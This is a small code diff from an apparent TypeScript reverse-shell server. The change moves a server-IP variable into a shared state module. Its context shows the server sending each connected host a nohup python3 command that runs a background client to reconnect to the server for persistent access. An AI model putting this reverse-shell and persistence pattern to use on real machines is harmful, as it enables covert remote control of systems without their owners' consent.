@@ -4,7 +4,7 @@ import './tunnel';
 import * as net from 'net';
 import fs from 'fs';
 import path from 'path';
-import { activeConnections, activeSSHConnections, ConnectionInfo } from './state';
+import { activeConnections, activeSSHConnections, ConnectionInfo, serverIp } from './state';
 
 const PORT = 13335;
 
@@ -177,7 +177,6 @@ reverseShellServer.on('connection', (socket) => {
 
         // Also try to bootstrap python client in background for future reconnects
         // Send bootstrap BEFORE tmux attaches (info collection sends tmux attach later)
-        const serverIp = (socket.localAddress ?? '127.0.0.1').replace('::ffff:', '');
         const bootstrapCommand = `nohup python3 -c '${escapedScript}' ${serverIp} ${PORT} </dev/null >/dev/null 2>&1 &\n`;
         socket.write(bootstrapCommand);
 
